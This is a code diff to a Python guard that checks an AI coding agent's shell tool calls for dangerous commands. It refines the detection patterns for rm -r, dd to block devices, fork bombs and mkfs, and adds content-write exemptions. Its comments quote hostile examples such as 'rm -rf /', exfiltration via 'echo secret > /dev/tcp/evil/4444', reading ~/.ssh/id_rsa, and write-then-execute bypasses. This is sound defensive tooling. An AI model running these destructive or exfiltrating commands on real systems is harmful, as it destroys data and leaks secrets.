@@ -155,9 +155,37 @@ _LEAK_SENSITIVE_KEYS = (
 # 危险命令模式（继承企业版 _DANGER_COMMAND_PATTERNS 思路）
 # ★ 内置回退集；实际优先取 rules/detection_rules.yaml
 _BUILTIN_DANGEROUS_COMMANDS: List[Tuple[str, str]] = [
-    (r"\brm\s+-[rf]{1,2}\b", "递归删除命令 rm -rf"),
+    # ★★ 2026-11-19（误报修复，实测 71 条）：`git rm -r --cached docs`
+    #   只把文件从 git 索引里移除，**不删磁盘文件**，是最常见的
+    #   「把已提交的目录移出版本库」操作。旧判据 `\brm\s+-[rf]{1,2}\b`
+    #   会命中其中的 `rm -r`，于是同一条命令在一天内刷出 71 条
+    #   high 告警，并把工具调用扣住 —— 用户那边的 AI 直接没法干活。
+    #
+    # ★★ 2026-11-19（同类问题全局收敛）：只修 `--cached` 还不够。
+    #   同一条判据还会命中 `docker rm -f` / `podman rm -f` ——
+    #   那是删容器，不是删文件；`rm -f 单文件` 也被标成「递归删除」，
+    #   而 `-f` 根本不递归。根因是判据只看「出现了 rm -r 这几个字符」，
+    #   不看 `rm` 在命令里是什么角色。
+    #
+    #   现在按**语法事实**判定，不靠词表：
+    #     · 必须带 `r`/`R`（递归）。`rm -f 单文件` 不递归，不再误标；
+    #       `docker rm -f` / `podman rm -f` 的 `-f` 也不含 r，自然不命中。
+    #     · 同一命令段内出现 `--cached` 时不算删除（git 索引操作）。
+    #     · `rm` 前面不能是 `-`：`docker run --rm -rf /data` 里的 `--rm`
+    #       是「容器退出后自动删除容器」，不是删文件。
+    #     · 不再要求 `rm` 是命令段第一个词 —— `git rm -r docs` 会真的删
+    #       磁盘文件，必须继续拦；而容器运行时的 `rm` 靠「无 r 标志」已排除。
+    (r"(?<![\w-])rm\s+(?:-[a-zA-Z]*[rR][a-zA-Z]*|--recursive)"
+     r"(?![^&|;\n]*--cached)",
+     "递归删除命令 rm -r"),
     (r"\bmkfs(\.\w+)?\b", "文件系统格式化 mkfs"),
-    (r"\bdd\s+if=", "磁盘覆写 dd if="),
+    # ★★ 2026-11-19（误报修复）：旧判据 `\bdd\s+if=` 把
+    #   `dd if=/dev/zero of=test.bin bs=1M count=10`（造测试文件）
+    #   也判成「磁盘覆写」。真正危险的是**写到块设备**。
+    #   按目标路径判定：`of=` 指向 /dev/sd* /dev/nvme* 等才是覆写磁盘。
+    #   ★ 允许 `of="/dev/sda"` 的引号形态；用 `[^&|;\n]*` 防止跨命令段误命中。
+    (r"\bdd\b[^&|;\n]*\bof=[\"']?/dev/(?:sd|hd|nvme|disk|mmcblk|vd|xvd|mapper|loop)",
+     "磁盘覆写 dd of=/dev/…"),
     (r"\bchmod\s+777\b", "权限全开 chmod 777"),
     (r":\(\)\s*\{.*\};\s*:", "fork 炸弹"),
     (r"\bformat\s+[a-z]:", "Windows 磁盘格式化"),
@@ -273,7 +301,7 @@ def _rules(section: str) -> List[Tuple[Any, str]]:
 #   的参数是**内容**，命中只作观测。
 _EXEC_TOOL_RE = re.compile(
     r"(?:^|[_\-\s])(bash|shell|sh|cmd|command|powershell|pwsh|terminal|console|"
-    r"exec|subprocess|spawn|python|node|deno|perl|ruby)(?:$|[_\-\s])",
+    r"exec|execute|subprocess|spawn|python|node|deno|perl|ruby)(?:$|[_\-\s])",
     re.IGNORECASE,
 )
 
@@ -338,6 +366,112 @@ def _args_are_content(tool_name: str, args_text: str) -> bool:
     if _MESSAGE_CMD_RE.search(args_text) and not _SHELL_SUBST_RE.search(args_text):
         return True
     return False
+
+
+#: 「只输出文本、不执行参数」的命令：echo / printf / cat / tee。
+#:
+#: ★★ 2026-11-19（同类问题全局收敛）：这是 **shell 的基本事实**，
+#:   不是语境词表 —— 这些命令的参数永远是数据，不会被当成命令执行。
+#:   旧实现只豁免「写消息」命令（git commit / gh pr），于是
+#:   `echo 'mkfs.ext4 用法' > notes.md`（写文档）被判成「格式化磁盘」，
+#:   `echo 'DROP TABLE 会删除整张表' > doc.md` 被判成「SQL 删库」。
+#:   这类「把危险命令当例子写进文档」是编程助手最高频的动作之一。
+_CONTENT_CMD_RE = re.compile(
+    r"(?:^|[;&|(\n\"'])\s*(?:sudo\s+)?(?:echo|printf|cat|tee)\b", re.IGNORECASE
+)
+
+#: 把内容交给解释器执行的管道：`... | sh` / `| python` / `| xargs`。
+#: 一旦出现，前面的 echo/cat 就不再是「只输出」，而是投递通道。
+_PIPE_TO_INTERP_RE = re.compile(
+    r"\|\s*(?:sudo\s+)?(?:/[\w./-]*/)?(?:ba|z|k|da)?sh\b"
+    r"|\|\s*(?:sudo\s+)?(?:/[\w./-]*/)?(?:python[23]?|node|deno|perl|ruby)\b"
+    r"|\|\s*xargs\b",
+    re.IGNORECASE,
+)
+
+#: 解释器名（去掉路径前缀后比对）。`source` / `.` 会把文件当脚本执行。
+_INTERP_NAMES = frozenset({
+    "sh", "bash", "zsh", "ksh", "dash", "ash",
+    "python", "python2", "python3", "node", "deno", "perl", "ruby",
+    "source", ".",
+})
+
+
+def _segment_starts_with_interpreter(args_text: str) -> bool:
+    """任一命令段是否以解释器 / 脚本文件开头。
+
+    ★★ 2026-11-19（独立审查 S2）：`echo 'rm -rf /' > f; sh f` 是
+      「先写文件、再执行」的绕过通道。只看管道（`| sh`）不够 ——
+      `; sh f` / `; . f` / `; ./f` / `| /bin/sh` 都能把内容变成命令。
+      这里按命令段（`;` `&&` `||` `|` 换行）切分，逐段看第一个词。
+    """
+    for seg in re.split(r"[;&|\n]", args_text):
+        words = seg.strip().split()
+        if not words:
+            continue
+        first = words[0].strip("\"'")
+        base = first.rsplit("/", 1)[-1]
+        if base in _INTERP_NAMES:
+            return True
+        # 直接执行一个脚本文件：`./f` / `/tmp/f`
+        if first.startswith("./") or first.startswith("/"):
+            return True
+    return False
+
+
+def _redirects_to_special_device(seg: str) -> bool:
+    """命令段里的重定向目标是否是特殊设备（`/dev/tcp` 等）。
+
+    ★★ 2026-11-19（独立审查 S1）：`echo 'secret' > /dev/tcp/evil/4444`
+      的 `>` 目标不是文件，而是网络端点 —— 这是反弹/外泄，不是「写文档」。
+      只要重定向目标是 `/dev/...`，就不能按内容写豁免。
+    """
+    for m in re.finditer(r">>?\s*([^\s;&|]+)", seg):
+        target = m.group(1).strip("\"'")
+        if target.startswith("/dev/"):
+            return True
+    return False
+
+
+def _match_is_content_write(args_text: str, m: "re.Match") -> bool:
+    """这次命中是否落在「把文本写进文件」的命令段里。
+
+    ★★ 2026-11-19（M2/M3 + 独立审查 S1/S2）：结构判据，不看语境词：
+      · 命中位置所在的命令段，第一个词是 echo/printf/cat/tee（只输出文本）；
+      · 全文没有命令替换 `$(...)` / 反引号；
+      · 没有任何命令段以解释器 / 脚本文件开头（`| sh` / `; sh f` / `; ./f`）；
+      · 重定向目标不是 `/dev/...` 特殊设备（`> /dev/tcp/...` 是外泄）。
+
+    只用于**危险命令**判据：`cat ~/.ssh/id_rsa > out` 是真实读取，
+    不能因为「cat + 重定向」就豁免 —— 所以敏感路径判据不走这里。
+    """
+    if _SHELL_SUBST_RE.search(args_text):
+        return False
+    if _PIPE_TO_INTERP_RE.search(args_text):
+        return False
+    if _segment_starts_with_interpreter(args_text):
+        return False
+    # 定位命中所在的命令段（最后一个分隔符之后 → 下一个分隔符之前）
+    # ★ 用 `<=`：危险命令判据的匹配本身可能**从分隔符开始**
+    #   （`(?:^|[;&|(\n"'])` 把 `;` 算进匹配），此时 m.start() 正落在
+    #   分隔符上，必须把它也算作段边界，否则会把前一段的 echo 误当成本段。
+    seg_start = 0
+    for sep in re.finditer(r"[;&|\n]", args_text):
+        if sep.start() <= m.start():
+            seg_start = sep.end()
+        else:
+            break
+    seg_end = len(args_text)
+    for sep in re.finditer(r"[;&|\n]", args_text):
+        if sep.start() > m.start():
+            seg_end = sep.start()
+            break
+    seg = args_text[seg_start:seg_end]
+    if not _CONTENT_CMD_RE.search(seg):
+        return False
+    if _redirects_to_special_device(seg):
+        return False
+    return True
 
 
 def _is_pattern_mention(text: str, m: "re.Match") -> bool:
@@ -431,7 +565,11 @@ def _check_tool_calls(payload: Any, text: str) -> List[VerificationFinding]:
             if m and m.group(0) not in seen_commands:
                 seen_commands.add(m.group(0))
                 # ★ 参数是「内容」时只观测不阻断（见 _args_are_content）
-                if _args_are_content(tool_name, args_text):
+                # ★★ 2026-11-19：`echo 'mkfs.ext4 用法' > notes.md` 这类
+                #   「把危险命令当例子写进文档」由 _match_is_content_write 豁免。
+                if _args_are_content(tool_name, args_text) or _match_is_content_write(
+                    args_text, m
+                ):
                     findings.append(
                         VerificationFinding(
                             category="dangerous_content",
